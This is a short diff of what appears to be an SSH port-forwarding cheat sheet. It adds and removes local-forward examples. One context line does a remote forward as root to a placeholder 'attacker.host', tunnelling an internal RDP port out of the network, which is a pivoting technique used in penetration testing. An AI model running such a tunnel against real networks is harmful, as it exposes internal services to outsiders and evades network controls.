@@ -4,13 +4,13 @@
 
 ```ssh -L 8443:127.0.0.1:8443 user@remote.host```
 
+```ssh -i id_rsa.key -L 6969:127.0.0.1:6969 user@remote.host```
+
 *remote port forward*
 
 ```ssh -R 5901:127.0.0.1:5901 user@remote.host```
 
 ```ssh -l root -t -t -R 3389:10.10.10.1:3398 attacker.host```
-
-```ssh -i id_rsa.key -L6969:machine.to.touch:80 machine.for.proxy```
 
 -----
 
